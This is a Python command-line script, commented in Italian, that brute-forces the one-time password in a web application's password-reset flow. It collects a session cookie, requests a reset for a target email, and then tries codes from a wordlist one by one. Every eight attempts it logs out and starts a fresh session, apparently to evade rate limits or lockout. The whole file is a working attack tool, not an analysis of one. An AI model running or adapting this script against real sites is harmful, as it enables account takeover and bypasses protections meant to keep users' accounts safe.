import argparse
import controll
import otp
import otp_request as otp_req
import forge_request as forge
from custom_exception import ArgumentsException

#Init CLi
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--email", required=True)
parser.add_argument("-o", "--otp", required=True)
parser.add_argument("-rp", "--rst_pw_url", required=True)
parser.add_argument("-ou", "--otp_url", required=True)
parser.add_argument("-er", "--error", required=True)
parser.add_argument("-m", "--method", required=False)

args = parser.parse_args()
error = args.error
#Check args cli and init variables
try:
    email_user = controll.is_email(args.email)
    otp_txt = controll.is_path_txt(args.otp)
    url_rst_pw = controll.is_url(args.rst_pw_url)
    url_otp = controll.is_url(args.otp_url)
    if(args.method):
        method = controll.is_method(args.method)
    else:
        method = "GET"
except ArgumentsException as e:
    print(e)

logout_page = "/logout.php"
logout_path = "/".join(url_rst_pw.split("/")[:3]) + logout_page

#load otp code to list
otp_codes = otp.otp_from_txt(otp_txt)

#Init cookie e n_request 
cookie = None
n_requests = 0
stop = False

while not stop:
    if not otp_codes:
        stop = True
    if n_requests == 0:
        #Prima Richiesta Prelevo cookie
        http_req_pwRst = forge.reset_pw_req(url_rst_pw)
        cookie = otp_req.do_request(http_req_pwRst)
        n_requests += 1
        #print("-------------PRELIEVO DEL COOKIE---------------")
    elif(n_requests == 1):
        #Seconda Richiesta con cookie settato
        http_req_pwRst = forge.reset_pw_req(url_rst_pw, email_user, cookie)
        #print("COOKIE:", cookie)
        otp_req.do_request(http_req_pwRst, flag = "pw") #richiedo il cambio, mostra OTP
        n_requests += 1
        #print("------------BRUTE FORCE RESPONSE------------")
    else:
        #Brute
        code = otp_codes.pop(0)
        http_req_OTP = forge.otp_brute_req(url_otp, cookie, code)
        otp_req.bruteOTP(http_req_OTP, error, cookie)
        n_requests += 1
        if(n_requests == 8):
            #esegui logout
            logout_req = forge.logout_req(logout_path, cookie)
            otp_req.logout(logout_req)
            n_requests = 0
            print(f"RIMANGONO {len(otp_codes)} OTP DA TESTARE")
print("--------NESSUN RISULTATO-------FINE---------")
